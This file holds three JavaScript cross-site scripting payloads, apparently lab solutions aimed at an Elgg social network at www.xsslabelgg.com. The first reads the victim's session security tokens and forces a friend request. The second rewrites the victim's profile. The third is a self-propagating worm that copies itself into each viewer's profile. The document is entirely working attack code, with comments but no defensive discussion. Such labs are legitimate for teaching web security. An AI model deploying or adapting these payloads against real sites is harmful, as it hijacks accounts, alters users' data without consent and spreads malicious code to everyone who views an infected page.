// Add a friend
<script type = "text/javascript">
window.onload = function () {
 // JavaScript code to access __elgg_ts(Time Stamp), and __elgg_token(Security Token)
 var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
 var token = "&__elgg_token=" +  elgg.security.token.__elgg_token;

 //Construct the content of your url
 var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;

 // Create and send Ajax request to add friend
 var Ajax = null;
 Ajax = new XMLHttpRequest();
 Ajax.open("GET", sendurl, true);
 Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
 Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 Ajax.send();
}
</script>

// Modify another users field
<script type = "text/javascript">
window.onload = function () {
 // JavaScript code to access username, user guid,  __elgg_ts(Time Stamp), and __elgg_token(Security Token)
 var userName = elgg.session.user.name;
 var guid = "&guid=" + elgg.session.user.guid;
 var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
 var token = "&__elgg_token=" +  elgg.security.token.__elgg_token;

 //Construct the content of your url
 var sendurl="http://www.xsslabelgg.com/action/profile/edit";
 var desc = "&description=Samy modified me!" + " &accesslevel[description]=2"
 var content = token+ts+"&name="+userName+desc+guid;
 var samyGuid = 47;

 // Send Ajax request to modify field
 if(elgg.session.user.guid != samyGuid){
  var Ajax = null;
  Ajax = new XMLHttpRequest();
  Ajax.open("POST", sendurl, true);
  Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
  Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  Ajax.send(content);
 }
}
</script>

// Modify and embedd worm, in a self propagating fashion
<script type="text/javascript" id="worm">
window.onload = function () {
 var header = "<script id=\"worm\" type=\"text/javascript\">";
 var js = document.getElementById("worm").innerHTML;
 var tail = "</" + "script>";
 var wormCode = encodeURIComponent(header + js + tail);
 // JavaScript code to access username, user guid,  __elgg_ts(Time Stamp), and __elgg_token(Security Token)
 var userName = elgg.session.user.name;
 var guid = "&guid=" + elgg.session.user.guid;
 var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
 var token = "&__elgg_token=" +  elgg.security.token.__elgg_token;

 //Construct the content of your url
 var sendurl="http://www.xsslabelgg.com/action/profile/edit";
 var desc = "&description=Samy modified me!" + wormCode + " &accesslevel[description]=2"
 var content = token+ts+"&name="+userName+desc+guid;
 var samyGuid = 47;
 
 // Send Ajax request to modify field
 if(elgg.session.user.guid != samyGuid){
  var Ajax = null;
  Ajax = new XMLHttpRequest();
  Ajax.open("POST", sendurl, true);
  Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
  Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  Ajax.send(content);
 }
}
</script>